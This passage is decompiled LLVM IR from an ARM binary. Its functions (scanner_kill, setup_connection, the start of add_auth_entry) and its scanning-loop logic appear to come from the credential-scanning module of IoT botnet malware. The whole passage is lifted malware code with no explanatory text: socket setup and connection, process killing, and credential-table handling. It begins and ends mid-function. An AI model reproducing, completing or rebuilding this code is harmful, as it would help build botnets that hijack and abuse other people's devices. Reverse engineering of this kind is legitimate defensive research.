  %v1_e9b024 = inttoptr i32 %v1_e99c to i8*
  %v2_e9b025 = load i8, i8* %v1_e9b024, align 1
  %v3_e9b026 = zext i8 %v2_e9b025 to i32
  store i32 %v3_e9b026, i32* %r2.global-to-local, align 4
  %v2_e9b427 = icmp eq i8 %v2_e9b025, 0
  store i1 %v2_e9b427, i1* %cpsr_z.global-to-local, align 1
  %v3_e9b828 = mul nuw nsw i32 %v3_e9b026, 256
  store i32 %v3_e9b828, i32* @r1, align 4
  br i1 %v2_e9b427, label %dec_label_pc_e9ec, label %dec_label_pc_e9c0.preheader

dec_label_pc_e9c0.preheader:                      ; preds = %dec_label_pc_e9a4, %dec_label_pc_e9b0.backedge
  %v1_ea30 = phi i32 [ %v1_ea3065, %dec_label_pc_e9b0.backedge ], [ 1, %dec_label_pc_e9a4 ]
  %v0_ea2863 = phi i32 [ %v0_ea28, %dec_label_pc_e9b0.backedge ], [ 0, %dec_label_pc_e9a4 ]
  %v0_e9cc61 = phi i32 [ %v3_e9b8, %dec_label_pc_e9b0.backedge ], [ %v3_e9b828, %dec_label_pc_e9a4 ]
  %v0_e9c859 = phi i32 [ %v1_ea2c, %dec_label_pc_e9b0.backedge ], [ %v1_e99c, %dec_label_pc_e9a4 ]
  %v0_e9c057 = phi i32 [ %v3_e9b0, %dec_label_pc_e9b0.backedge ], [ %v3_e9b026, %dec_label_pc_e9a4 ]
  br label %dec_label_pc_e9c0

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e9c0.preheader, %dec_label_pc_e9c8
  %v0_ea28 = phi i32 [ %v0_ea2863, %dec_label_pc_e9c0.preheader ], [ 1, %dec_label_pc_e9c8 ]
  %v0_e9cc = phi i32 [ %v0_e9cc61, %dec_label_pc_e9c0.preheader ], [ %v3_e9e4, %dec_label_pc_e9c8 ]
  %v0_ea2c = phi i32 [ %v0_e9c859, %dec_label_pc_e9c0.preheader ], [ %v2_e9d4, %dec_label_pc_e9c8 ]
  %v0_e9c0 = phi i32 [ %v0_e9c057, %dec_label_pc_e9c0.preheader ], [ %v3_e9d8, %dec_label_pc_e9c8 ]
  %v7_e9c0 = icmp eq i32 %v0_e9c0, 191
  store i1 %v7_e9c0, i1* %cpsr_z.global-to-local, align 1
  %tmp159 = icmp ult i32 %v0_e9c0, 192
  br i1 %tmp159, label %dec_label_pc_ea28, label %dec_label_pc_e9c8

dec_label_pc_e9c8:                                ; preds = %dec_label_pc_e9c0
  %v1_e9c8 = add i32 %v0_ea2c, 1
  %v2_e9c8 = inttoptr i32 %v1_e9c8 to i8*
  %v3_e9c8 = load i8, i8* %v2_e9c8, align 1
  %v4_e9c8 = zext i8 %v3_e9c8 to i32
  %v2_e9cc = or i32 %v4_e9c8, -49152
  %v0_e9d4 = load i32, i32* @r5, align 4
  %v1_e9d0 = add i32 %v0_e9d4, %v0_e9cc
  %v2_e9d4 = add i32 %v1_e9d0, %v2_e9cc
  store i32 %v2_e9d4, i32* %r3.global-to-local, align 4
  %v1_e9d8 = inttoptr i32 %v2_e9d4 to i8*
  %v2_e9d8 = load i8, i8* %v1_e9d8, align 1
  %v3_e9d8 = zext i8 %v2_e9d8 to i32
  store i32 %v3_e9d8, i32* %r2.global-to-local, align 4
  %v2_e9dc = icmp eq i8 %v2_e9d8, 0
  store i1 %v2_e9dc, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %ip.global-to-local, align 4
  %v3_e9e4 = mul nuw nsw i32 %v3_e9d8, 256
  store i32 %v3_e9e4, i32* @r1, align 4
  br i1 %v2_e9dc, label %dec_label_pc_e9ec, label %dec_label_pc_e9c0

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e9b0.backedge, %dec_label_pc_e9c8, %dec_label_pc_e9a4
  %v1_e9f0 = phi i32 [ 1, %dec_label_pc_e9a4 ], [ %v1_ea30, %dec_label_pc_e9c8 ], [ %v1_ea3065, %dec_label_pc_e9b0.backedge ]
  %v0_e9ec = phi i32 [ 0, %dec_label_pc_e9a4 ], [ 1, %dec_label_pc_e9c8 ], [ %v0_ea28, %dec_label_pc_e9b0.backedge ]
  %v7_e9ec = icmp eq i32 %v0_e9ec, 1
  store i1 %v7_e9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9ec, label %bb121, label %bb122

bb121:                                            ; preds = %dec_label_pc_e9ec
  %v2_e9f0 = add i32 %v1_e9f0, 1
  store i32 %v2_e9f0, i32* %r0.global-to-local, align 4
  br label %bb122

bb122:                                            ; preds = %dec_label_pc_ea4c, %dec_label_pc_e9ec, %bb121
  %v1_e9f4 = phi i32 [ %v5_ea64, %dec_label_pc_ea4c ], [ %v1_e9f0, %dec_label_pc_e9ec ], [ %v2_e9f0, %bb121 ]
  %v2_e9f4 = add i32 %v1_e9f4, %v1_e99c
  br label %dec_label_pc_e924.backedge

dec_label_pc_e924.backedge:                       ; preds = %bb122, %dec_label_pc_ea70
  %v0_e924.pre = phi i32 [ %v3_e930144, %bb122 ], [ %v0_e924.pre.pre, %dec_label_pc_ea70 ]
  %storemerge29 = phi i32 [ %v2_e9f4, %bb122 ], [ %v2_eae8, %dec_label_pc_ea70 ]
  store i32 %storemerge29, i32* %r0.global-to-local, align 4
  %v1_e924 = add i32 %v0_e924.pre, -1
  %v3_e928 = mul i32 %v1_e924, 65536
  store i32 %v3_e928, i32* %r3.global-to-local, align 4
  %v7_e92c = icmp eq i32 %v3_e928, -65536
  store i1 %v7_e92c, i1* %cpsr_z.global-to-local, align 1
  %v3_e930 = urem i32 %v1_e924, 65536
  store i32 %v3_e930, i32* @r8, align 4
  br i1 %v7_e92c, label %dec_label_pc_e8ac, label %dec_label_pc_e938

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e8ac
  %v1_e9fc = add i32 %v0_e8b4, 4
  %v2_e9fc = inttoptr i32 %v1_e9fc to i32*
  %v3_e9fc = load i32, i32* %v2_e9fc, align 4
  store i32 %v3_e9fc, i32* %r0.global-to-local, align 4
  %v2_ea00 = icmp eq i32 %v3_e9fc, 0
  store i1 %v2_ea00, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_ea08.138 to i32), i32* @lr, align 4
  %v1_ea04 = xor i1 %v2_ea00, true
  call void @__pseudo_cond_branch(i1 %v1_ea04, i32 ptrtoint (i32* @global_var_135dc.33 to i32))
  %v0_ea08 = load i32, i32* @fp, align 4
  store i32 %v0_ea08, i32* @r0, align 4
  %v0_ea0c = call i32 @free()
  store i32 %v0_ea0c, i32* %r0.global-to-local, align 4
  %v0_ea10 = load i32, i32* @r4, align 4
  br label %dec_label_pc_e8c0

dec_label_pc_ea18:                                ; preds = %dec_label_pc_e954
  %v2_ea18 = icmp eq i32 %v0_ea18, 0
  store i1 %v2_ea18, i1* %cpsr_z.global-to-local, align 1
  %v1_ea1c = add i32 %v0_ea1c, 1
  store i32 %v1_ea1c, i32* %r3.global-to-local, align 4
  br i1 %v2_ea18, label %bb123, label %dec_label_pc_e944.backedge

dec_label_pc_e944.backedge:                       ; preds = %dec_label_pc_ea18, %bb123
  %v1_ea2050 = phi i32 [ %v1_ea20, %dec_label_pc_ea18 ], [ %v2_ea20, %bb123 ]
  %v1_e944 = inttoptr i32 %v1_ea1c to i8*
  %v2_e944 = load i8, i8* %v1_e944, align 1
  %v3_e944 = zext i8 %v2_e944 to i32
  store i32 %v3_e944, i32* %r2.global-to-local, align 4
  %v2_e948 = icmp eq i8 %v2_e944, 0
  store i1 %v2_e948, i1* %cpsr_z.global-to-local, align 1
  %v3_e94c = mul nuw nsw i32 %v3_e944, 256
  store i32 %v3_e94c, i32* @r1, align 4
  br i1 %v2_e948, label %dec_label_pc_e980, label %dec_label_pc_e954.preheader

bb123:                                            ; preds = %dec_label_pc_ea18
  %v2_ea20 = add i32 %v1_ea20, 1
  store i32 %v2_ea20, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e944.backedge

dec_label_pc_ea28:                                ; preds = %dec_label_pc_e9c0
  %v2_ea28 = icmp eq i32 %v0_ea28, 0
  store i1 %v2_ea28, i1* %cpsr_z.global-to-local, align 1
  %v1_ea2c = add i32 %v0_ea2c, 1
  store i32 %v1_ea2c, i32* %r3.global-to-local, align 4
  br i1 %v2_ea28, label %bb124, label %dec_label_pc_e9b0.backedge

dec_label_pc_e9b0.backedge:                       ; preds = %dec_label_pc_ea28, %bb124
  %v1_ea3065 = phi i32 [ %v1_ea30, %dec_label_pc_ea28 ], [ %v2_ea30, %bb124 ]
  %v1_e9b0 = inttoptr i32 %v1_ea2c to i8*
  %v2_e9b0 = load i8, i8* %v1_e9b0, align 1
  %v3_e9b0 = zext i8 %v2_e9b0 to i32
  store i32 %v3_e9b0, i32* %r2.global-to-local, align 4
  %v2_e9b4 = icmp eq i8 %v2_e9b0, 0
  store i1 %v2_e9b4, i1* %cpsr_z.global-to-local, align 1
  %v3_e9b8 = mul nuw nsw i32 %v3_e9b0, 256
  store i32 %v3_e9b8, i32* @r1, align 4
  br i1 %v2_e9b4, label %dec_label_pc_e9ec, label %dec_label_pc_e9c0.preheader

bb124:                                            ; preds = %dec_label_pc_ea28
  %v2_ea30 = add i32 %v1_ea30, 1
  store i32 %v2_ea30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e9b0.backedge

dec_label_pc_ea38:                                ; preds = %bb120
  %v1_ea38 = add i32 %v2_e988, 2
  %v2_ea38 = inttoptr i32 %v1_ea38 to i8*
  %v3_ea38 = load i8, i8* %v2_ea38, align 1
  %v4_ea38 = zext i8 %v3_ea38 to i32
  store i32 %v4_ea38, i32* %r3.global-to-local, align 4
  %v1_ea3c = add i32 %v2_e988, 3
  %v2_ea3c = inttoptr i32 %v1_ea3c to i8*
  %v3_ea3c = load i8, i8* %v2_ea3c, align 1
  %v4_ea3c = zext i8 %v3_ea3c to i32
  store i32 %v4_ea3c, i32* %r2.global-to-local, align 4
  %v4_ea40 = mul nuw nsw i32 %v4_ea3c, 256
  %v5_ea40 = or i32 %v4_ea40, %v4_ea38
  store i32 %v5_ea40, i32* %r3.global-to-local, align 4
  %v7_ea44 = icmp eq i32 %v5_ea40, 256
  store i1 %v7_ea44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea44, label %dec_label_pc_ea4c, label %dec_label_pc_e9a4

dec_label_pc_ea4c:                                ; preds = %dec_label_pc_ea38
  %v1_ea4c = add i32 %v2_e988, 9
  %v2_ea4c = inttoptr i32 %v1_ea4c to i8*
  %v3_ea4c = load i8, i8* %v2_ea4c, align 1
  %v4_ea4c = zext i8 %v3_ea4c to i32
  store i32 %v4_ea4c, i32* %r2.global-to-local, align 4
  %v1_ea50 = add i32 %v2_e988, 8
  %v2_ea50 = inttoptr i32 %v1_ea50 to i8*
  %v3_ea50 = load i8, i8* %v2_ea50, align 1
  %v4_ea50 = zext i8 %v3_ea50 to i32
  %v4_ea54 = mul nuw nsw i32 %v4_ea4c, 256
  %v5_ea54 = or i32 %v4_ea50, %v4_ea54
  %v3_ea58 = mul i32 %v5_ea54, 65536
  store i32 %v3_ea58, i32* %r3.global-to-local, align 4
  %v3_ea5c = mul nuw nsw i32 %v4_ea50, 256
  store i32 %v3_ea5c, i32* %r2.global-to-local, align 4
  %v5_ea64 = or i32 %v3_ea5c, %v4_ea4c
  store i32 %v5_ea64, i32* %r0.global-to-local, align 4
  %v7_ea68 = icmp eq i32 %v5_ea64, 4
  store i1 %v7_ea68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea68, label %dec_label_pc_ea70, label %bb122

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea4c
  %v2_ea70 = inttoptr i32 %v1_e99c to i8*
  %v3_ea70 = load i8, i8* %v2_ea70, align 1
  %v4_ea70 = zext i8 %v3_ea70 to i32
  store i32 %v4_ea70, i32* %r3.global-to-local, align 4
  store i32 %v2_e680, i32* %r2.global-to-local, align 4
  %v1_ea7c = add i32 %v2_e988, 11
  %v2_ea7c = inttoptr i32 %v1_ea7c to i8*
  %v3_ea7c = load i8, i8* %v2_ea7c, align 1
  %v4_ea7c = zext i8 %v3_ea7c to i32
  store i32 %v4_ea7c, i32* %r2.global-to-local, align 4
  store i32 %v2_e680, i32* %r3.global-to-local, align 4
  %v1_ea88 = add i32 %v2_e988, 12
  %v2_ea88 = inttoptr i32 %v1_ea88 to i8*
  %v3_ea88 = load i8, i8* %v2_ea88, align 1
  %v4_ea88 = zext i8 %v3_ea88 to i32
  store i32 %v4_ea88, i32* %r3.global-to-local, align 4
  store i32 %v2_e680, i32* %ip.global-to-local, align 4
  %v1_ea94 = add i32 %v2_e988, 13
  %v2_ea94 = inttoptr i32 %v1_ea94 to i8*
  %v3_ea94 = load i8, i8* %v2_ea94, align 1
  %v4_ea94 = zext i8 %v3_ea94 to i32
  store i32 %v4_ea94, i32* %r2.global-to-local, align 4
  %v0_ea9c = load i32, i32* @fp, align 4
  %v1_ea9c = inttoptr i32 %v0_ea9c to i8*
  %v2_ea9c = load i8, i8* %v1_ea9c, align 1
  %v3_ea9c = zext i8 %v2_ea9c to i32
  %v1_eaa0 = mul nuw nsw i32 %v3_ea9c, 4
  %v3_eaa4 = add nuw nsw i32 %v1_eaa0, 4
  store i32 %v3_eaa4, i32* %r1.global-to-local, align 4
  %v1_eaa8 = add i32 %v0_ea9c, 4
  %v2_eaa8 = inttoptr i32 %v1_eaa8 to i32*
  %v3_eaa8 = load i32, i32* %v2_eaa8, align 4
  store i32 %v3_eaa8, i32* %r0.global-to-local, align 4
  %v3_eaac = sext i8 %v3_ea94 to i32
  %v5_eaac = sext i8 %v3_ea88 to i32
  %v10_eaac = inttoptr i32 %v3_eaa8 to i32*
  %v11_eaac = call i32 @realloc(i32* %v10_eaac, i32 %v3_eaa4, i32 %v3_eaac, i32 %v5_eaac)
  store i32 %v11_eaac, i32* %r0.global-to-local, align 4
  %v0_eab0 = load i32, i32* @fp, align 4
  %v1_eab0 = inttoptr i32 %v0_eab0 to i8*
  %v2_eab0 = load i8, i8* %v1_eab0, align 1
  %v3_eab0 = zext i8 %v2_eab0 to i32
  store i32 %v3_eab0, i32* %r2.global-to-local, align 4
  store i32 %v2_e680, i32* @lr, align 4
  %v4_eab8 = sext i8 %v3_ea70 to i32
  store i32 %v4_eab8, i32* %r3.global-to-local, align 4
  %v1_eabc = add nuw nsw i32 %v3_eab0, 1
  store i32 %v1_eabc, i32* @r1, align 4
  %v5_eac0 = mul nuw nsw i32 %v3_eab0, 4
  %v6_eac0 = add i32 %v5_eac0, %v11_eaac
  %v7_eac0 = inttoptr i32 %v6_eac0 to i32*
  store i32 %v4_eab8, i32* %v7_eac0, align 4
  %v1_eac4 = load i32, i32* @fp, align 4
  %v2_eac4 = add i32 %v1_eac4, 4
  %v3_eac4 = inttoptr i32 %v2_eac4 to i32*
  store i32 %v11_eaac, i32* %v3_eac4, align 4
  %v0_eac8 = load i32, i32* @r1, align 4
  %v1_eac8 = trunc i32 %v0_eac8 to i8
  %v2_eac8 = load i32, i32* @fp, align 4
  %v3_eac8 = inttoptr i32 %v2_eac8 to i8*
  store i8 %v1_eac8, i8* %v3_eac8, align 1
  %v0_eacc = load i32, i32* @r4, align 4
  %v1_eacc = add i32 %v0_eacc, 9
  %v2_eacc = inttoptr i32 %v1_eacc to i8*
  %v3_eacc = load i8, i8* %v2_eacc, align 1
  %v4_eacc = zext i8 %v3_eacc to i32
  store i32 %v4_eacc, i32* %r3.global-to-local, align 4
  %v1_ead0 = add i32 %v0_eacc, 8
  %v2_ead0 = inttoptr i32 %v1_ead0 to i8*
  %v3_ead0 = load i8, i8* %v2_ead0, align 1
  %v4_ead0 = zext i8 %v3_ead0 to i32
  %v4_ead4 = mul nuw nsw i32 %v4_eacc, 256
  %v5_ead4 = or i32 %v4_ead0, %v4_ead4
  %v3_ead8 = mul i32 %v5_ead4, 65536
  store i32 %v3_ead8, i32* %r2.global-to-local, align 4
  %v3_eadc = mul nuw nsw i32 %v4_ead0, 256
  store i32 %v3_eadc, i32* %r3.global-to-local, align 4
  %v5_eae4 = or i32 %v3_eadc, %v4_eacc
  store i32 %v5_eae4, i32* %r0.global-to-local, align 4
  %v0_eae8 = load i32, i32* @r7, align 4
  %v2_eae8 = add i32 %v0_eae8, %v5_eae4
  %v0_e924.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e924.backedge

; uselistorder directives
  uselistorder i32 %v3_eadc, { 1, 0 }
  uselistorder i32 %v4_eacc, { 1, 0, 2 }
  uselistorder i32 %v11_eaac, { 1, 0, 2 }
  uselistorder i32 %v3_eaa4, { 1, 0 }
  uselistorder i32 %v5_ea64, { 1, 2, 0 }
  uselistorder i32 %v3_ea5c, { 1, 0 }
  uselistorder i32 %v4_ea4c, { 1, 0, 2 }
  uselistorder i32 %v2_ea30, { 1, 0 }
  uselistorder i32 %v3_e9b0, { 0, 2, 1 }
  uselistorder i32 %v1_ea3065, { 1, 0 }
  uselistorder i32 %v1_ea2c, { 1, 2, 0 }
  uselistorder i32 %v2_ea20, { 1, 0 }
  uselistorder i32 %v3_e944, { 0, 2, 1 }
  uselistorder i32 %v1_ea2050, { 1, 0 }
  uselistorder i32 %v1_ea1c, { 1, 2, 0 }
  uselistorder i1 %v7_e92c, { 1, 0 }
  uselistorder i32 %v1_e924, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_e9d8, { 0, 2, 1 }
  uselistorder i32 %v2_e9d4, { 1, 2, 0 }
  uselistorder i32 %v0_ea28, { 2, 0, 1 }
  uselistorder i32 %v1_ea30, { 1, 2, 0 }
  uselistorder i32 %v3_e9b828, { 1, 0 }
  uselistorder i32 %v3_e9b026, { 1, 0, 2 }
  uselistorder i32 %v1_e99c, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_e988, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_e96c, { 0, 2, 1 }
  uselistorder i32 %v2_e968, { 1, 2, 0 }
  uselistorder i32 %v0_ea18, { 2, 0, 1 }
  uselistorder i32 %v1_ea20, { 1, 2, 0 }
  uselistorder i32 %v3_e94c22, { 1, 0 }
  uselistorder i32 %v3_e94420, { 1, 0, 2 }
  uselistorder i32 %v0_e988143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_e930142, { 1, 0 }
  uselistorder i1 %v7_e92c141, { 1, 0 }
  uselistorder i32 %v1_e924134, { 1, 0 }
  uselistorder i1 %v9_e900, { 1, 0 }
  uselistorder i32 %v0_e8c0, { 1, 0 }
  uselistorder i32 %v0_e8b4, { 1, 0, 2 }
  uselistorder i32 %v0_e8a4, { 1, 0 }
  uselistorder i32 %v0_e87c, { 1, 0 }
  uselistorder i32 %v1_e830, { 1, 0, 2 }
  uselistorder i1 %v7_e828, { 1, 0 }
  uselistorder i32 %v5_e824, { 1, 0, 2 }
  uselistorder i32 %v1_e7ec, { 1, 0 }
  uselistorder i32 %v3_e7d8, { 1, 0 }
  uselistorder i32 %v0_e7d0, { 1, 0 }
  uselistorder i32 %v1_e7c4, { 1, 2, 0 }
  uselistorder i1 %v7_e77c, { 1, 0 }
  uselistorder i32 %v4_e778, { 1, 0, 2 }
  uselistorder i1 %v7_e760, { 1, 0 }
  uselistorder i32 %v3_e75c, { 1, 0, 2 }
  uselistorder i1 %v7_e744, { 1, 0 }
  uselistorder i32 %v3_e740, { 2, 1, 0, 3 }
  uselistorder i1 %v7_e728, { 2, 1, 0 }
  uselistorder i32 %v1_e72c, { 1, 0 }
  uselistorder i32 %v2_e7dc, { 1, 0 }
  uselistorder i32 %v2_e7b4, { 1, 0, 2 }
  uselistorder i16 %v5_e6d0, { 1, 0 }
  uselistorder i32 %v2_e6cc, { 1, 0, 2 }
  uselistorder i32 %v6_e6b8, { 1, 2, 0 }
  uselistorder i64 %v5_e6b4, { 0, 2, 1 }
  uselistorder i32 %v1_e6a0, { 1, 0, 2 }
  uselistorder i32 %v1_e658, { 1, 0 }
  uselistorder i32 %v1_e654, { 1, 2, 0 }
  uselistorder i32 %v2_e650, { 1, 0 }
  uselistorder i1 %v8_e63c, { 1, 0 }
  uselistorder i32 %v2_e614, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 37 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 12, 8, 27, 10, 11, 26, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 34, 35, 36, 37, 38, 39, 40, 41, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 10, 4, 15, 5, 6, 16, 7, 8, 9, 0, 11, 12, 13, 14, 35, 36, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 27, 28, 29, 34, 31, 32, 30, 33, 37 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 5, 6, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e9b0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e944.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e924.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e9c0, { 1, 0 }
  uselistorder label %dec_label_pc_e9c0.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_e954, { 1, 0 }
  uselistorder label %dec_label_pc_e954.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_e938, { 1, 0 }
  uselistorder label %dec_label_pc_e8c0, { 1, 0 }
  uselistorder label %dec_label_pc_e8ac, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e88c, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_e634, { 1, 0 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_eafc = load i32, i32* @global_var_24f9c.140, align 4
  %v2_eb04 = call i32 @kill(i32 %v2_eafc, i32 9)
  ret i32 %v2_eb04

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_eb18 = load i32, i32* @r4, align 4
  store i32 %v3_eb18, i32* %stack_var_-16, align 4
  %v6_eb18 = load i32, i32* @r5, align 4
  %v9_eb18 = load i32, i32* @r6, align 4
  %v12_eb18 = load i32, i32* @lr, align 4
  %v0_eb1c = load i32, i32* @r0, align 4
  store i32 %v0_eb1c, i32* @r5, align 4
  %v1_eb20 = add i32 %v0_eb1c, 4
  %v2_eb20 = inttoptr i32 %v1_eb20 to i32*
  %v3_eb20 = load i32, i32* %v2_eb20, align 4
  store i32 %v3_eb20, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 60228, i32* @lr, align 4
  %v1_eb40 = icmp ne i32 %v3_eb20, -1
  call void @__pseudo_cond_branch(i1 %v1_eb40, i32 ptrtoint (i32* @global_var_14ab0.112 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_eb4c = load i32, i32* @r6, align 4
  store i32 %v0_eb4c, i32* %r2.global-to-local, align 4
  %v3_eb50 = call i32 @socket(i32 2, i32 1, i32 %v0_eb4c)
  store i32 %v3_eb50, i32* %r0.global-to-local, align 4
  %v7_eb54 = icmp eq i32 %v3_eb50, -1
  %v1_eb58 = load i32, i32* @r5, align 4
  %v2_eb58 = add i32 %v1_eb58, 4
  %v3_eb58 = inttoptr i32 %v2_eb58 to i32*
  store i32 %v3_eb50, i32* %v3_eb58, align 4
  br i1 %v7_eb54, label %entry.dec_label_pc_ebd0_crit_edge, label %dec_label_pc_eb60

entry.dec_label_pc_ebd0_crit_edge:                ; preds = %entry
  %v1_ebd8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ebd0

dec_label_pc_eb60:                                ; preds = %entry
  %v2_eb24 = ptrtoint i32* %stack_var_-32 to i32
  %v0_eb60 = load i32, i32* @r5, align 4
  %v1_eb60 = add i32 %v0_eb60, 28
  store i32 %v1_eb60, i32* @r0, align 4
  %v0_eb64 = load i32, i32* @r6, align 4
  %v2_eb64 = add i32 %v0_eb60, 24
  %v3_eb64 = inttoptr i32 %v2_eb64 to i32*
  store i32 %v0_eb64, i32* %v3_eb64, align 4
  store i32 256, i32* @r1, align 4
  %v0_eb6c = call i32 @util_zero()
  store i32 %v0_eb6c, i32* %r0.global-to-local, align 4
  %v0_eb70 = load i32, i32* @r5, align 4
  %v1_eb70 = add i32 %v0_eb70, 4
  %v2_eb70 = inttoptr i32 %v1_eb70 to i32*
  %v3_eb70 = load i32, i32* %v2_eb70, align 4
  store i32 %v3_eb70, i32* @r4, align 4
  %v0_eb74 = load i32, i32* @r6, align 4
  store i32 %v0_eb74, i32* @r2, align 4
  store i32 %v3_eb70, i32* %r0.global-to-local, align 4
  %v2_eb80 = call i32 @__libc_fcntl(i32 %v3_eb70, i32 3)
  %v1_eb88 = or i32 %v2_eb80, 2048
  store i32 %v1_eb88, i32* @r2, align 4
  %v0_eb8c = load i32, i32* @r4, align 4
  store i32 %v0_eb8c, i32* %r0.global-to-local, align 4
  %v2_eb90 = call i32 @__libc_fcntl(i32 %v0_eb8c, i32 4)
  store i32 %v2_eb90, i32* %r0.global-to-local, align 4
  %v2_eb98 = load i32, i32* @global_var_224b0.142, align 4
  store i32 %v2_eb98, i32* %r2.global-to-local, align 4
  %v1_eba0 = load i32, i32* @r5, align 4
  %v2_eba0 = add i32 %v1_eba0, 12
  %v3_eba0 = inttoptr i32 %v2_eba0 to i32*
  store i32 1, i32* %v3_eba0, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_ebac = load i32, i32* %r2.global-to-local, align 4
  %v1_ebac = load i32, i32* @r5, align 4
  %v2_ebac = add i32 %v1_ebac, 8
  %v3_ebac = inttoptr i32 %v2_ebac to i32*
  store i32 %v0_ebac, i32* %v3_ebac, align 4
  %v0_ebb0 = load i32, i32* @r5, align 4
  %v1_ebb4 = add i32 %v0_ebb0, 4
  %v2_ebb4 = inttoptr i32 %v1_ebb4 to i32*
  %v3_ebb4 = load i32, i32* %v2_ebb4, align 4
  store i32 %v3_ebb4, i32* %r0.global-to-local, align 4
  %v1_ebb8 = add i32 %v0_ebb0, 20
  %v2_ebb8 = inttoptr i32 %v1_ebb8 to i16*
  %v3_ebb8 = load i16, i16* %v2_ebb8, align 2
  %v4_ebb8 = zext i16 %v3_ebb8 to i32
  store i32 %v4_ebb8, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_ebcc = call i32 @__libc_connect(i32 %v3_ebb4, i32 %v2_eb24, i32 16)
  store i32 %v3_ebcc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %entry.dec_label_pc_ebd0_crit_edge, %dec_label_pc_eb60
  %v1_ebd8 = phi i32 [ %v1_ebd8.pre, %entry.dec_label_pc_ebd0_crit_edge ], [ %v3_ebcc, %dec_label_pc_eb60 ]
  %v2_ebd4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_ebd4, i32* @r4, align 4
  store i32 %v6_eb18, i32* @r5, align 4
  store i32 %v9_eb18, i32* @r6, align 4
  store i32 %v12_eb18, i32* @lr, align 4
  ret i32 %v1_ebd8

; uselistorder directives
  uselistorder i32 %v3_eb50, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_ebd0, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_ebe0 = load i32, i32* @r4, align 4
  %v6_ebe0 = load i32, i32* @r5, align 4
